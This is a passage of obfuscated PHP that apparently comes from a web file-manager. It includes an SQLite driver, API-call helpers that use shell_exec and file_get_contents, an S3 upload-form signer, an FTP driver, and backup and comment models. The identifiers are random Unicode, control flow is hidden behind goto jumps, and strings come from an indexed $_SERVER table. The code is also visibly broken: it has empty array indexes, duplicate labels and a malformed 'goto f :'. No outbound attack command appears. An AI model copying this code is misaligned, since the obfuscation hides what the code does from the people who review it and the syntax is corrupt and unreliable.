$this->free(); } think_action_status($Bٵ[19], 1); goto E䏃; E䏃: think_status($Bٵ[20]); $this->queryID = $this->_linkID->query($Eڌ扜); $this->debug(); goto cś٠; aŊ: $Bٵ =& $_SERVER[놫Ӱ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A; cś٠: if (!1 === $this->queryID) { $this->error(); return !1; } else { $fߋ = $this->getAll(); $this->numRows = count($fߋ); return $fߋ; } goto c҄؈; c҄؈: } public function execute($C) { goto e; e: $B =& $_SERVER[놫Ӱ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto A; A: $this->queryStr = $C; if ($this->queryID) { $this->free(); } think_action_status($B[21], 1); goto eȄߩ; eȩ: if (!1 === $eʌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Fͭ; eȄߩ: think_status($B[20]); $eʌ = $this->_linkID->exec($C); $this->debug(); goto eȩ; Fͭ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[놫Ӱ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C҇ = $this->_linkID->query($_SERVER[놫Ӱ][23]); if (!$C҇) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $bٱ = $this->_linkID->query($_SERVER[놫Ӱ][24]); if (!$bٱ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $b쫓 = array(); while ($A断 = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $b쫓[] = $A断; } $this->queryID->reset(); return $b쫓; } public function getFields($eȧ) { $e =& $_SERVER[놫Ӱ]; $C䌄ˎ = $this->query($e[25] . $eȧ . $e[26]); $D = array(); if ($C䌄ˎ) { foreach ($C䌄ˎ as $E => $c堗Ї) { $D[$c堗Ї[$e[28]]] = array($e[28] => $c堗Ї[$e[28]], $e[29] => $c堗Ї[$e[29]], $e[31] => (bool) ($c堗Ї[$e[31]] === $e[33]), $e[34] => $c堗Ї[$e[53]], $e[36] => (bool) $c堗Ї[$e[54]], $e[39] => (bool) $c堗Ї[$e[54]]); } } return $D; } public function getTables($a٘ = '') { $dƄɛ =& $_SERVER[놫Ӱ]; $Bʡʼ = $this->query($dƄɛ[42] . $dƄɛ[43] . $dƄɛ[44]); $B× = array(); foreach ($Bʡʼ as $c => $f) { $B×[$c] = current($f); } return $B×; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F =& $_SERVER[놫Ӱ]; $this->error = $this->_linkID->lastErrorMsg(); if ($F[33] != $this->queryStr) { $this->error .= LNG($F[45]) . $this->queryStr; } think_trace($this->error, $F[33], $F[46]); return $this->error; } public function escapeString($Eęֆ) { $B؄֮׏ =& $_SERVER[놫Ӱ]; if ($this->_linkID) { return $this->_linkID->escapeString($Eęֆ); } return str_ireplace($B؄֮׏[55], $B؄֮׏[56], $Eęֆ); } public function parseLimit($fυ) { $D =& $_SERVER[놫Ӱ]; $F = $D[33]; if (!empty($fυ)) { $fυ = explode($D[47], $fυ); if (count($fυ) > 1) { $F .= $D[48] . $fυ[1] . $D[49] . $fυ[0] . $D[50]; } else { $F .= $D[48] . $fυ[0] . $D[50]; } } return $F; } } goto DŪ; EƠ: function ActionCall($F) { $C = array_slice(func_get_args(), 1); return ActionApply($F, $C); } function ActionCallApi($aڇ傅, $f = '') { goto E; D΅: return $Eω; goto bƗ¤; D: $cئ = Action($Bӵ[21])->accessToken(); $aڇ傅 = str_replace($Bӵ[3], $Bӵ[2], $aڇ傅) . $Bӵ[22] . $cئ . $Aݶ; $c = $Bӵ[18]; goto E龑; E龑: $eÚ = phpBinCommand(); if ($eÚ && function_exists($Bӵ[23])) { $Cފ = $eÚ . $Bӵ[24] . BASIC_PATH . $Bӵ[25] . escapeshellarg($aڇ傅); $c = shell_exec($Cފ); } if (!$c) { $aΎ = stream_context_create(array($Bӵ[26] => array($Bӵ[27] => 20, $Bӵ[28] => $Bӵ[29]))); $c = file_get_contents(app_host_get() . $aڇ傅, !1, $aΎ); } goto BŔ; E: $Bӵ =& $_SERVER[]; $Aݶ = $f; if (is_array($f)) { $Aݶ = $Bӵ[18]; foreach ($f as $eÛ => $bƒК) { $bƒК = is_array($bƒК) ? json_encode($bƒК) : $bƒК; $bƒК = is_bool($bƒК) ? intval($bƒК) : $bƒК; $Aݶ .= $Bӵ[19] . $eÛ . $Bӵ[20] . rawurlencode($bƒК); } } goto D; BŔ: $AنΒ = json_decode($c, !0); $Eω = is_array($AنΒ) ? $AنΒ : array($Bӵ[30] => null, $Bӵ[31] => $c); if (!$AنΒ) { echo $c; } goto D΅; bƗ¤: } function ActionCallHook($Fٽ) { goto f; fӑ׌: $bΗʄ = $c ? json_decode($c, !0) : $bΗʄ; $GLOBALS[$Cճҗ[32]] = 0; return $bΗʄ; goto eۺ; e: $GLOBALS[$Cճҗ[32]] = 1; $bΗʄ = ActionApply($Fٽ, $f); $c = ob_get_clean(); goto fӑ׌; f: $Cճҗ =& $_SERVER[]; ob_start(); $f = array_slice(func_get_args(), 1); goto e; eۺ: } goto C; Fҋܯ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($F⑂) { $this->pathParse = $F⑂; } protected function infoParse($DЏў) { $Aȭ =& $_SERVER[놫Ӱ]; return Action($Aȭ[989])->sharePathInfo($this->pathParse[$Aȭ[76]], !0); } public function listAll($aʟԅ) { $b霒 =& $_SERVER[놫Ӱ]; $d = IO::listAll($aʟԅ); foreach ($d as &$E瘇) { check_abort(); $E瘇 = array_merge(IO::info($E瘇[$b霒[76]]), $E瘇); $E瘇[$b霒[388]] = Action($b霒[989])->itemInfo($E瘇); $bѨ = substr($E瘇[$b霒[76]], strpos(ltrim($E瘇[$b霒[76]], $b霒[8]), $b霒[8]) + 1); $E瘇[$b霒[388]][$b霒[76]] = $this->pathParse[$b霒[984]] . $bѨ; } return $d; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Aχ) { parent::__construct($Aχ); $this->signatureVersion($_SERVER[놫Ӱ][197]); } public function uploadFormData($fŅ͘, $Dы = 3600) { goto b; F: $F؅ = array($fԇ[196] => $fԇ[33], $fԇ[1102] => $fԇ[33], $fԇ[1064] => $f񃏨, $fԇ[1068] => $bȰ, $fԇ[1072] => $eե, $fԇ[1103] => $Fǔ, $fԇ[1104] => $bݴ, $fԇ[1105] => $A캃۰, $fԇ[1106] => $F휬, $fԇ[1107] => $A, $fԇ[166] => $this->getHost()); return $F؅; goto E; D֬Í: $aٲ߆ = $fԇ[1092]; $F휬 = $Dы . $fԇ[33]; $bȰ = $fԇ[1060]; goto C; aу: $eե = base64_encode(json_encode($fȯ)); $eﱔ = hash_hmac($fԇ[1100], $Dٳԉ, $fԇ[1101] . $this->secret, !0); $aΎ = hash_hmac($fԇ[1100], $this->region, $eﱔ, !0); goto cޚވ; b: $fԇ =& $_SERVER[놫Ӱ]; $f񃏨 = $fԇ[182]; $bݴ = $fԇ[1090]; goto D; C: $eօ = array($this->accessKey, $Dٳԉ, $this->region, $D覺, $aٲ߆); $Fǔ = implode($fԇ[8], $eօ); $fȯ = array($fԇ[1062] => gmdate($fԇ[1061], strtotime($fԇ[1093])), $fԇ[1063] => array(array($fԇ[1065] => $this->bucket), array($fԇ[1064] => $f񃏨), array($fԇ[1066], $fԇ[1067], $fԇ[33]), array($fԇ[1066], $fԇ[1094], $fԇ[33]), array($fԇ[1066], $fԇ[1095], $fԇ[33]), array($fԇ[1068] => $bȰ), array($fԇ[1096] => $Fǔ), array($fԇ[1097] => $bݴ), array($fԇ[1098] => $A캃۰), array($fԇ[1099] => $F휬))); goto aу; D: $D覺 = $fԇ[59]; $A캃۰ = gmdate($fԇ[1091]); $Dٳԉ = gmdate($fԇ[675]); goto D֬Í; cޚވ: $aɦ׽ = hash_hmac($fԇ[1100], $D覺, $aΎ, !0); $Aտ = hash_hmac($fԇ[1100], $aٲ߆, $aɦ׽, !0); $A = hash_hmac($fԇ[1100], $eե, $Aտ); goto F; E: } public function fileOutLink($d̪ꌉ) { header($_SERVER[놫Ӱ][153] . $d̪ꌉ); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($F烾) { parent::__construct(); if (count($F烾) > 0) { $this->_init($F烾); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($F) { $fͥ =& $_SERVER[놫Ӱ]; global $config; $this->appCharset = $config[$fͥ[1108]]; $this->systemCharset = $config[$fͥ[1109]]; if (isset($F[$fͥ[1110]]) && $F[$fͥ[1110]]) { $this->systemCharset = $F[$fͥ[1110]]; } } public function iconvApp($B) { return $this->iconvTo($B, $this->systemCharset, $this->appCharset); } public function iconvSystem($eȷ) { return $this->iconvTo($eȷ, $this->appCharset, $this->systemCharset); } public function getPathOuter($C򸞅) { goto aˈ; aˈ: $b =& $_SERVER[놫Ӱ]; $A = $this->iconvApp($this->pathBase); $C򸞅 = $this->iconvApp($C򸞅); goto Eۤ; Fΐ: return $this->pathDriver . $b[8] . ltrim($C򸞅, $b[8]); goto C; Eۤ: if (substr($A, 0, 2) == $b[1111]) { $A = BASIC_PATH . substr($A, 2); } if (substr($C򸞅, 0, 2) == $b[1111]) { $C򸞅 = BASIC_PATH . substr($C򸞅, 2); } $A = KodIO::clear($A); goto aϸ; aϸ: $C򸞅 = KodIO::clear($C򸞅); $C򸞅 = substr($C򸞅, strlen($A)); if (empty($this->pathDriver)) { return $C򸞅; } goto Fΐ; C: } private function _init($dϬ = array()) { goto b≊; d܆: $CЦ = isset($e֜[$cˊ[165]]) && $e֜[$cˊ[165]] == $cˊ[1114] ? !0 : !1; $this->scheme = $CЦ ? $cˊ[1115] : $cˊ[1116]; $this->port = isset($e֜[$cˊ[167]]) ? $e֜[$cˊ[167]] : 21; goto bߌŢኂ; d: foreach ($dϬ as $b͟ => $a) { if (isset($this->{$b͟})) { $this->{$b͟} = $a; } } $e֜ = parse_url(trim($this->server, $cˊ[8])); $this->host = $e֜[$cˊ[166]]; goto d܆; c׃ǐو: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); return $Dᦃ; goto dʘﴭ; b≊: $cˊ =& $_SERVER[놫Ӱ]; if (!function_exists($cˊ[1112])) { show_json(LNG($cˊ[1113]), !1); } $this->charsetReset($dϬ); goto d; bߌŢኂ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $Dᦃ = @ftp_login($this->connect, $this->username, $this->userpass); goto c׃ǐو; dʘﴭ: } private function _isconn() { return is_resource($this->connect); } public function mkfile($dՇ, $e = '', $Aь = REPEAT_RENAME) { if ($this->setContent($dՇ, $e)) { return $this->getPathOuter($dՇ); } return !1; } public function mkdir($D𑮊, $dя񄹾 = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $D𑮊 = $this->iconvSystem($D𑮊); if ($this->isFolder($D𑮊) || @ftp_mkdir($this->connect, $D𑮊)) { return $this->getPathOuter($D𑮊); } if (!$this->mkdir($this->pathFather($D𑮊))) { return !1; } if ($D𑮊 = @ftp_mkdir($this->connect, $D𑮊)) { return $this->getPathOuter($D𑮊); } return !1; } public function copyFile($C, $AөԨ) { goto dۏ; fᢌ: $this->tempFileRemve($d񰷬); return $dƷ; goto fܤ; dۏ: if (!$this->_isconn()) { return !1; } $Eߧ = $this->pathThis($this->iconvSystem($C)); $d񰷬 = $this->tempFile($Eߧ); goto a; a: $eǖ = $this->iconvApp($d񰷬); $this->download($C, $eǖ); $dƷ = $this->upload($AөԨ, $eǖ); goto fᢌ; fܤ: } public function moveFile($aϷ, $Fٌ) { if (!$this->_isconn()) { return !1; } $aϷ = $this->iconvSystem($aϷ); $Fٌ = $this->iconvSystem($Fٌ); $Aƨ = @ftp_rename($this->connect, $aϷ, $Fٌ); return $Aƨ ? $this->getPathOuter($Fٌ) : !1; } public function delFile($fǽֱ) { if (!$this->_isconn()) { return !1; } $fǽֱ = $this->iconvSystem($fǽֱ); return @ftp_delete($this->connect, $fǽֱ); } public function delFolder($AϗʗՅ) { if (!$this->_isconn()) { return !1; } $AϗʗՅ = $this->iconvSystem($AϗʗՅ); $B쫌 = $this->ftpList($AϗʗՅ); if (!$B쫌) { return @ftp_rmdir($this->connect, $AϗʗՅ); } foreach ($B쫌 as $aߕޒ) { if ($this->isFolder($aߕޒ)) { $aߕޒ = $this->iconvApp($aߕޒ); $this->delFolder($aߕޒ); } else { @ftp_delete($this->connect, $aߕޒ); } } return @ftp_rmdir($this->connect, $AϗʗՅ); } public function rename($c䝋М, $e݇) { goto d; D: return $A ? $this->getPathOuter($Fԉ) : !1; goto e; d: $B =& $_SERVER[놫Ӱ]; if (!$this->_isconn()) { return !1; } $aԺ = $this->fileNameAuto($this->pathFather($c䝋М), $e݇); goto c; bΎ: $Fԉ = rtrim($e̵̅, $B[8]) . $B[8] . $aԺ; $A = @ftp_rename($this->connect, $c䝋М, $Fԉ); $Fԉ = $this->iconvApp($Fԉ); goto D; c: $aԺ = $this->iconvSystem($aԺ); $c䝋М = $this->iconvSystem($c䝋М); $e̵̅ = $this->pathFather($c䝋М); goto bΎ; e: } private function folderInfo($cѪ, $Cꞻ = false) { $f =& $_SERVER[놫Ӱ]; $dй̐ = $this->iconvApp($this->pathThis($cѪ)); if ($Cꞻ) { return array($f[28] => $dй̐, $f[76] => $this->getPathOuter($cѪ), $f[29] => $f[77]); } $D˿ = array($f[28] => $dй̐, $f[76] => $this->getPathOuter($cѪ), $f[29] => $f[77], $f[184] => $f[50], $f[106] => $f[50], $f[1117] => !0, $f[1118] => !0); return $D˿; } private function fileInfo($dҺ, $A֕ = false) { $EŊ =& $_SERVER[놫Ӱ]; $dҺ = rtrim($dҺ, $EŊ[8]); $AЎ = $this->iconvApp($this->pathThis($dҺ)); if ($A֕) { return array($EŊ[28] => $AЎ, $EŊ[76] => $this->getPathOuter($dҺ), $EŊ[29] => $EŊ[164], $EŊ[157] => $this->ext($dҺ), $EŊ[78] => $this->size($dҺ)); } $EǊܥ = array($EŊ[28] => $AЎ, $EŊ[76] => $this->getPathOuter($dҺ), $EŊ[29] => $EŊ[164], $EŊ[184] => $EŊ[50], $EŊ[106] => @ftp_mdtm($this->connect, $dҺ), $EŊ[157] => $this->ext($dҺ), $EŊ[78] => $this->size($dҺ), $EŊ[1117] => !0, $EŊ[1118] => !0); return $EǊܥ; } public function size($EѼ) { $D鸟 = $this->objectMeta($EѼ); return $D鸟 ? $D鸟[$_SERVER[놫Ӱ][78]] : 0; } public function info($F) { if ($this->isFile($F)) { return $this->fileInfo($F, 1); } else { if ($this->isFolder($F)) { return $this->folderInfo($F); } } return !1; } public function exist($f) { return $this->objectMeta($f) ? !0 : !1; } public function isFile($B) { $C =& $_SERVER[놫Ӱ]; $e걳 = $this->objectMeta($B); return $e걳 ? $e걳[$C[29]] == $C[164] : !1; } public function isFolder($C՚ݘ) { $d􎝡 =& $_SERVER[놫Ӱ]; $D = $this->objectMeta($C՚ݘ); return $D ? $D[$d􎝡[29]] == $d􎝡[77] : !1; } public function listPath($f, $d۴ = false) { goto CӋ; cۭ뇌: $b = $this->ftpList($f); $aޯ = array($dԹ[75] => array(), $dԹ[74] => array()); if (!$b) { return $aޯ; } goto D; CӋ: $dԹ =& $_SERVER[놫Ӱ]; if (!$this->_isconn()) { return !1; } $f = $this->iconvSystem($f); goto cۭ뇌; D: foreach ($b as $f) { if ($this->isFolder($f)) { $aޯ[$dԹ[75]][] = $this->folderInfo($f, $d۴); } else { $aޯ[$dԹ[74]][] = $this->fileInfo($f, $d۴); } } return $aޯ; goto eΝգ; eΝգ: } public function has($dۜ܎, $E몱 = false, $c = true) { goto B渍; D񧬤: foreach ($dݱҩ as $dۜ܎) { if ($c) { if (!$this->isFolder($dۜ܎)) { return !0; } } else { if ($this->isFolder($dۜ܎)) { return !0; } } } return !1; goto D܊ȶ; B渍: $Bꇣ =& $_SERVER[놫Ӱ]; if (!$this->_isconn()) { return !1; } $dۜ܎ = $this->iconvSystem($dۜ܎); goto F״; F״: $dݱҩ = $this->ftpList($dۜ܎); if (!$dݱҩ) { return !1; } if ($E몱) { return array($Bꇣ[188] => 0, $Bꇣ[189] => count($dݱҩ)); } goto D񧬤; D܊ȶ: } public function listAll($Cȵť) { goto F֎; F֎: $dȑܦ =& $_SERVER[놫Ӱ]; if (!$this->_isconn()) { return !1; } $Cȵť = $this->iconvSystem($Cȵť); goto A誹; A誹: $Aւޗ = $this->recursionFtpFiles($Cȵť); $AÌ = array(); foreach ($Aւޗ[$dȑܦ[75]] as $dȇЄ) { $AÌ[] = array($dȑܦ[76] => $dȑܦ[8] . trim(str_replace($Cȵť, $dȑܦ[33], $dȇЄ), $dȑܦ[8]) . $dȑܦ[8], $dȑܦ[77] => 1, $dȑܦ[78] => 0); } goto Aǫ; Aǫ: foreach ($Aւޗ[$dȑܦ[74]] as $Fث) { $AÌ[] = array($dȑܦ[76] => $dȑܦ[8] . trim(str_replace($Cȵť, $dȑܦ[33], $Fث), $dȑܦ[8]), $dȑܦ[77] => 0, $dȑܦ[78] => $this->size($Fث)); } return $AÌ; goto E茇; E茇: } public function getContent($Bɸ߃) { if (!$this->_isconn()) { return !1; } $Bɸ߃ = $this->iconvSystem($Bɸ߃); return $this->fileSubstr($Bɸ߃); } public function setContent($A͊, $E趏 = '') { goto Eۆ; Eۆ: if (!$this->_isconn()) { return !1; } $Aٙ = $this->pathThis($this->iconvSystem($A͊)); $B͚ = $this->tempFile($Aٙ); goto A; Dݰ: return $Dҧ; goto Fʑ; A: file_put_contents($B͚, $E趏); $Dҧ = $this->upload($A͊, $this->iconvApp($B͚)); $this->tempFileRemve($B͚); goto Dݰ; Fʑ: } public function fileSubstr($b͂, $bٿ׈ = 0, $EӉ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($b͂, $bٿ׈, $EӉ); } private function ftpRequest($F, $dφ = 0, $Bߵ = false) { goto aݧ; b: curl_setopt($A, CURLOPT_RETURNTRANSFER, 1); $B = curl_exec($A); curl_close($A); goto b; b: return $B; goto d橩; Fυ: curl_setopt($A, CURLOPT_URL, $Dᅠ . $this->pathEncode($F)); curl_setopt($A, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Bߵ) { $a = $dφ + $Bߵ - 1; curl_setopt($A, CURLOPT_RANGE, "{$dφ}\55{$a}"); } goto b; aݧ: $F = $this->iconvSystem($F); $Dᅠ = $this->scheme . $this->host . $_SERVER[놫Ӱ][4] . $this->port; $A = curl_init(); goto Fυ; d橩: } public function upload($Aմ܄, $C˻, $f⩆ = false, $A愬 = REPEAT_REPLACE) { goto E; E: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Aմ܄))) { return !1; } $Aմ܄ = $this->iconvSystem($Aմ܄); goto Bߎ; f콣: if ($C != FTP_FINISHED) { return !1; } return $this->getPathOuter($Aմ܄); goto F֨; Bߎ: $C˻ = $this->iconvSystem($C˻); $C = ftp_nb_put($this->connect, $Aմ܄, $C˻, FTP_BINARY); while ($C == FTP_MOREDATA) { $C = ftp_nb_continue($this->connect); } goto f콣; F֨: } public function download($D, $C = '') { goto Cՙɪ; Cՙɪ: if (!$this->_isconn()) { return !1; } $Aǰ = $this->pathFather($C); if (!IO::mkdir($Aǰ)) { return !1; } goto cܖ֥; cܖ֥: $D = $this->iconvSystem($D); $C = $this->iconvSystem($C); $d = ftp_nb_get($this->connect, $C, $D, FTP_BINARY); goto D،; D،: while ($d == FTP_MOREDATA) { $d = ftp_nb_continue($this->connect); } if ($d != FTP_FINISHED) { return !1; } return $this->iconvApp($C); goto F鹿; F鹿: } private function ftpList($f) { goto d; DɃ: $f = rtrim($f, $bȾ[8]) . $bȾ[8]; $cŰ = @ftp_nlist($this->connect, $f); if ($cŰ === !1) { $cŰ = @ftp_rawlist($this->connect, $f); $D = array(); $f = trim($f, $bȾ[8]); if (!empty($f)) { $f = $bȾ[8] . $f; } foreach ($cŰ as $dǛ) { $b = end(explode($bȾ[1119], $dǛ)); $D[] = $f . $bȾ[8] . trim($b, $bȾ[8]); } return $D; } goto E; d: $bȾ =& $_SERVER[놫Ӱ]; if (!$this->isFolder($f)) { return !1; } @ftp_chdir($this->connect, $bȾ[8]); goto DɃ; E: return array_map(function ($Dډ) { $E =& $_SERVER[놫Ӱ]; return $E[8] . ltrim($Dډ, $E[8]); }, $cŰ); goto Dҵ; Dҵ: } private function recursionFtpFiles($Cݻܕ) { $e =& $_SERVER[놫Ӱ]; if (!$this->_isconn()) { return !1; } if (!($e̲ = $this->ftpList($Cݻܕ))) { return !1; } static $E = array(); foreach ($e̲ as $Cݻܕ) { if ($this->isFolder($Cݻܕ)) { $this->recursionFtpFiles($Cݻܕ, $E); $E[$e[75]][] = $Cݻܕ; } else { $E[$e[74]][] = $Cݻܕ; } } return $E; } private function objectMeta($a䕾) { goto c񡍤݂; fۘ: return $B⦷; goto dĊ; c񡍤݂: $B =& $_SERVER[놫Ӱ]; $d缘 = $B[1120] . md5($a䕾); $B⦷ = Cache::get($d缘); goto E; Bٸ: $F = @ftp_size($this->connect, $this->iconvSystem($a䕾)); if ($F != -1 && $F < 0) { $B⦷ = !1; } else { $B⦷ = array($B[78] => $F); $B⦷[$B[29]] = $F == -1 || $a䕾 == $B[8] ? $B[77] : $B[164]; } Cache::set($d缘, $B⦷, 0); goto fۘ; E: if ($B⦷ !== null && $B⦷ !== !1) { return $B⦷; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $B[8]); goto Bٸ; dĊ: } } goto a; e: $_SERVER[$_SERVER[][49]] = (_kodDe('KCcvKi0=')."\x39\x33")+0;$_iPzb="MfiyfaXUYzt9Gu23gDz8f8cAxUuejR4NWJjkf2dM3u7FvVzyCZkRSKxGyUZsPrGceFuHPRMsbA5x";; stream_wrapper_register($_SERVER[][50], $_SERVER[][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($a, $c) { $b䅓 =& $_SERVER[놫Ӱ]; if (isset(self::$_methodList[$a])) { return @call_user_func_array(self::$_methodList[$a], $c); } else { if (method_exists($this, $a)) { return call_user_func_array(array($this, $a), $c); } else { think_exception(__CLASS__ . $b䅓[4] . $a . $b䅓[5]); } } } public static function __callStatic($a־, $d۾Ӣ) { if (isset(self::$_methodListStatic[$a־])) { return call_user_func_array(self::$_methodListStatic[$a־], $d۾Ӣ); } else { if (method_exists(self, $a־)) { return call_user_func_array(array(self, $a־), $d۾Ӣ); } else { show_json("{$a־}\50\51\40\x6e\157\164\x20\145\170\x69\163\164\73", !1); } } } public static function addMethod($E晠ќ, $eƫư) { self::$_methodList[$E晠ќ] = $eƫư; } public static function addMethodStatic($aŠт, $Ał) { self::$_methodListStatic[$aŠт] = $Ał; } } goto E; f : class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\142\141\143\153\165\160\114\x69\163\x74"; public $field = array("\151\x6f", "\156\x61\155\145", "\x73\x74\141\164\x75\163", "\143\157\x6e\164\x65\156\x74", "\x72\145\163\165\x6c\164", "\x74\151\155\x65\x46\x72\x6f\155", "\x74\151\155\x65\x54\157"); public function config() { goto Eӽ; CЃ: Action($f鄸[2024])->taskInit(); $dɎ = Model($f鄸[2025])->listData(); foreach ($dɎ as $Aޝ) { if ($Aޝ[$f鄸[1047]] == $f鄸[493] && $Aޝ[$f鄸[1327]] == $f鄸[2026]) { $Dڻ = $Aޝ; break; } } goto a׵Ҳ; e: $Cơѡ = is_array($Cơѡ) ? $Cơѡ : array(); if (!isset($Cơѡ[$f鄸[677]])) { $Cơѡ[$f鄸[677]] = $f鄸[464]; } $Dڻ = array(); goto CЃ; a׵Ҳ: if (isset($Dڻ[$f鄸[187]])) { $Dڻ[$f鄸[187]] = json_decode($Dڻ[$f鄸[187]], !0); } if (isset($Cơѡ[$f鄸[187]])) { $Dڻ[$f鄸[187]][$f鄸[1314]] = $Cơѡ[$f鄸[187]]; unset($Cơѡ[$f鄸[187]]); } return array_merge($Dڻ, $Cơѡ); goto eΛ; Eӽ: $f鄸 =& $_SERVER[놫Ӱ]; $Cơѡ = Model($f鄸[1055])->get($f鄸[696]); $Cơѡ = json_decode($Cơѡ, !0); goto e; eΛ: } public function listData($BȜ = false, $f֧њ = "\155\157\144\151\146\x79\124\x69\x6d\145", $bƴ堍 = false) { return parent::listData($BȜ, $f֧њ, !0); } public function lastItem() { $b˝ = $this->listData(); return !empty($b˝[0]) ? $b˝[0] : null; } public function kill($B) { goto cë; cë: $D̈́˻ =& $_SERVER[놫Ӱ]; $c = $this->listData($B); if (!$c || empty($c[$D̈́˻[28]])) { return !0; } goto D񷰲; B㼓: return $this->remove($B); goto aͷ; D񷰲: Task::kill($D̈́˻[695]); Task::kill($D̈́˻[725]); Task::kill($D̈́˻[732]); goto d; d: $b = $c[$D̈́˻[28]]; $Fѯ = TEMP_FILES . $D̈́˻[703] . $b . $D̈́˻[8]; IO::remove($Fѯ, !1); goto B㼓; aͷ: } public function remove($A粳) { $f􅝭 = $this->listData($A粳); if (!$f􅝭) { return !0; } return $this->backupRemove($f􅝭); } private function backupRemove($F) { $fíȃ =& $_SERVER[놫Ӱ]; parent::remove($F[$fíȃ[364]]); $FР = "\173\151\157\x3a{$F[$fíȃ[676]]}\175\57\x64\x61\164\141\142\141\163\x65\x2f" . $F[$fíȃ[28]]; IO::remove($FР, !1); return !0; } public function start() { goto F՚; Cʝ: $A݄ = new Backup(); $A݄->keep(); if (!$A݄->db()) { return !1; } goto A; C،: return !0; goto eݨ; F՚: $e鷠 =& $_SERVER[놫Ӱ]; $C춟 = $this->config(); if (!$C춟 || $C춟[$e鷠[1312]] != $e鷠[493]) { return !1; } goto a; a: if (Hook::trigger($e鷠[2027]) == $e鷠[2028]) { return !0; } $fӕ = $this->process(); foreach ($fӕ as $DϏ) { if ($DϏ) { return Task::restart($DϏ[$e鷠[364]]); } } goto Cʝ; A: if (!$A݄->dbFile()) { return !1; } if ($C춟[$e鷠[677]] == $e鷠[464]) { $A݄->file(); } Backup::set(array($e鷠[674] => 1, $e鷠[688] => time())); goto C،; eݨ: } public function process() { $Aь =& $_SERVER[놫Ӱ]; return array($Aь[679] => Task::get($Aь[695]), $Aь[682] => Task::get($Aь[725]), $Aь[164] => Task::get($Aь[732])); } public function restore() { $Dڍ =& $_SERVER[놫Ӱ]; ActionCall($Dڍ[2029], !0, 1); ActionCall($Dڍ[2029], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\x65\x6e\164"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\145" => "\x63\x6f\x6d\x6d\145\x6e\164\137\155\145\x74\141", "\x6d\145\164\141\x46\x69\x65\154\x64" => "\x63\x6f\155\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($dٌ繸) { $bږ =& $_SERVER[놫Ӱ]; if ($dٌ繸[$bږ[2030]]) { $Bѥ҂ = $this->where(array($bږ[2031] => $dٌ繸[$bږ[2030]]))->find(); if (!$Bѥ҂ || $Bѥ҂[$bږ[368]] != $dٌ繸[$bږ[368]] || $Bѥ҂[$bږ[452]] != $dٌ繸[$bږ[452]]) { return !1; } $this->where(array($bږ[2031] => $dٌ繸[$bږ[2030]]))->setAdd($bږ[2032], 1); } return $this->add($dٌ繸); } public function remove($Bˊ) { $cӬ =& $_SERVER[놫Ӱ]; $AȐݼ = array($cӬ[2031] => $Bˊ); $E裏 = $this->where($AȐݼ)->find(); if ($E裏[$cӬ[2030]]) { $this->where(array($cӬ[2031] => $E裏[$cӬ[2030]]))->setAdd($cӬ[2032], -1); } return $this->where($AȐݼ)->delete(); } public function edit($Fǣο, $b) { $A߭ =& $_SERVER[놫Ӱ]; $C = array($A߭[2031] => $Fǣο); return $this->where($C)->save(array($A߭[2033] => $b)); } public function prasise($C) { $b꼂 =& $_SERVER[놫Ӱ]; $c𶶽 = Model($b꼂[2034]); $CŰ = array($b꼂[2031] => $C, $b꼂[1330] => USER_ID); $d = $c𶶽->where($CŰ)->find(); if (!$d) { $c𶶽->add($CŰ); $d߾ = $this->where(array($b꼂[2031] => $C))->setAdd($b꼂[2035], 1); } else { $c𶶽->where($CŰ)->delete(); $d߾ = $this->where(array($b꼂[2031] => $C))->setAdd($b꼂[2035], -1); } return $d߾; } public function targetInfo($Cߐ, $e) { goto e; d: return $B; goto Cԫ; A詐: $C͕ = "\x52\x49\107\110\124\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\143\157\155\x6d\x65\x6e\164\137\x70\x72\x61\151\163\x65\40\163\x74\141\162\x20\157\156\40\143\x6f\x6d\155\x65\x6e\164\x2e\143\x6f\x6d\155\x65\156\x74\x49\104\x20\75\40\163\164\x61\162\56\143\x6f\155\x6d\x65\156\164\111\x44"; $bɭÐÇ = $this->alias($C҂[337])->where($b)->join($C͕, $C҂[2036])->count(); $B = array($C҂[2037] => $aҰ, $C҂[2038] => $bɭÐÇ); goto d; e: $C҂ =& $_SERVER[놫Ӱ]; $b = array($C҂[514] => $Cߐ, $C҂[515] => $e); $aҰ = $this->where($b)->count(); goto A詐; Cԫ: } public function listData($d) { $B =& $_SERVER[놫Ӱ]; if (isset($d[$B[2039]])) { 